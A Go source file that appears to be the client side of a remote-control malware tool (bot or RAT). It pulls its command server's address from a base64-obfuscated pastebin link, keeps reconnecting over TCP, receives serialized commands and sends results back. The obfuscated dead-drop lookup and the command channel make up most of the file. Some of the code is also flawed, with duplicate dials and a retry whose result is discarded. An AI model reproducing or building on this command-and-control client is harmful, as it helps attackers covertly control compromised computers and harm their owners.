package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"strings"

	"./capnp"

	"zombiezen.com/go/capnproto2"
)

var c net.Conn //Global variable to send and receive from anywhere
var ip string

func Connect() (net.Conn, error) {

	ip = GetIp()
	_, err := net.Dial("tcp", ip)
	if err != nil {
		fmt.Println(err.Error())
		Wait()
		Connect()
	}
	return net.Dial("tcp", ip)
}

func GetIp() string {
	resp, _ := http.Get(Base64Decode("aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvQnVHOTdCU2s="))
	defer resp.Body.Close()
	respBody, _ := ioutil.ReadAll(resp.Body)

	return strings.TrimLeft(string(respBody), "tcp://")
}

func Send(pre string, msg string) {
	c.Write([]byte(pre + "|" + msg)) //var c is located in client.go
}

func ReciveCommand() commands.Command {

	msg, err := capnp.NewDecoder(c).Decode()
	if err != nil {
		panic(err)
	}
	// Extract the root struct from the message.
	commad, err := commands.ReadRootCommand(msg)
	if err != nil {
		panic(err)
	}

	// Access fields from the struct.
	return commad
}

func Receive() string {
	status, err := bufio.NewReader(c).ReadString('\n')
	if err != nil {
		c, _ = Connect()
	}
	return status
}
